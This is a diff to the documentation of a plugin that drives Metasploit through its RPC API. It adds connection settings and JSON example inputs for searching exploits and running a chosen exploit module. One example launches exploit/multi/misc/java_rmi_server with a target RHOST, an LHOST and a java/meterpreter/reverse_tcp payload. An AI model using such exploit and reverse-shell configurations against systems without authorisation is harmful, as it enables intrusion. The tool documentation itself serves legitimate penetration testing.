@@ -14,6 +14,10 @@ This plugin utilizes the Metasploit [RPC API](https://metasploit.help.rapid7.com
 
 * Username and password
 
+# Supported Product Versions
+
+* 4.20.0-2021091301
+
 # Documentation
 
 ## Setup
@@ -23,14 +27,20 @@ The connection configuration accepts the following parameters:
 |Name|Type|Default|Required|Description|Enum|Example|
 |----|----|-------|--------|-----------|----|-------|
 |credentials|credential_username_password|None|True|Username and password|None|None|
-|port|integer|55553|False|Port|None|None|
-|server|string|None|False|Remote server IP|None|None|
-|ssl|boolean|True|False|Use SSL|None|None|
-|uri|string|/api/|False|The msfrpcd URI|None|None|
+|port|integer|55553|False|Port|None|55553|
+|server|string|None|False|Remote server IP|None|https://example.com|
+|ssl|boolean|True|False|Use SSL|None|True|
+|uri|string|/api/|False|The msfrpcd URI|None|/api/|
 
 Example input:
 
 ```
+{
+  "port": 55553,
+  "server": "example.com",
+  "ssl": true,
+  "uri": "/api/"
+}
 ```
 
 ## Technical Details
@@ -45,11 +55,14 @@ This action is used to search for an exploit within Metasploit over an RPC sessi
 
 |Name|Type|Default|Required|Description|Enum|Example|
 |----|----|-------|--------|-----------|----|-------|
-|search_term|string|None|True|Search term, e.g. 'vsftp'|None|None|
+|search_term|string|None|True|Search term, e.g. 'vsftp'|None|vsftp|
 
 Example input:
 
 ```
+{
+  "search_term": "vsftp"
+}
 ```
 
 ##### Output
@@ -84,12 +97,21 @@ This action is used to run a selected Metasploit exploit.
 
 |Name|Type|Default|Required|Description|Enum|Example|
 |----|----|-------|--------|-----------|----|-------|
-|module|string|None|True|A Metasploit module e.g exploit/multi/misc/java_rmi_server|None|None|
-|options|object|None|False|Metasploit module options e.g {"RHOST":"10.0.2.5", "RPORT":"1099", "LHOST":"10.0.2.15", "payload":"java/meterpreter/reverse_tcp"}|None|None|
+|module|string|None|True|A Metasploit module|None|exploit/multi/misc/java_rmi_server|
+|options|object|None|False|Metasploit module options|None|{"RHOST":"https://example.com", "RPORT":"1099", "LHOST":"https://example.com", "payload":"java/meterpreter/reverse_tcp"}|
 
 Example input:
 
 ```
+{
+  "module": "exploit/multi/misc/java_rmi_server",
+  "options": {
+    "RHOST": "10.0.2.5",
+    "RPORT": "1099",
+    "LHOST": "10.0.2.15",
+    "payload": "java/meterpreter/reverse_tcp"
+  }
+}
 ```
 
 ##### Output
